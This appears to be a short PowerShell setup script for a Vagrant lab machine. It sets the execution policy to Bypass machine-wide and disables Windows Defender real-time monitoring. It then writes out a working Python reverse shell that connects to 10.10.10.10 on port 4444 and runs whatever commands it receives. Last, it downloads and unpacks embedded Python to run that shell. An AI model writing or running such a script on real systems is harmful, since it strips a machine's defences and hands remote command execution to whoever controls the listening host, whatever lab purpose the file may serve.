Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
Set-MpPreference -DisableRealtimeMonitoring $true

mkdir C:\Users\vagrant\lab
[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", "import socket, subprocess`n`ns = socket.socket()`ns.connect(('10.10.10.10', 4444))`nwhile True:`n    cmd = s.recv(1024).decode().strip()`n    if not cmd:`n        break`n    output = subprocess.run(cmd, shell=True, capture_output=True)`n    s.send(output.stdout + output.stderr)`n")

(New-Object Net.WebClient).DownloadFile("https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip", "C:\Users\vagrant\lab\py.zip")
Remove-Item C:\Users\vagrant\lab\pyembed -Recurse -Force -ErrorAction SilentlyContinue; Expand-Archive C:\Users\vagrant\lab\py.zip -DestinationPath C:\Users\vagrant\lab\pyembed;
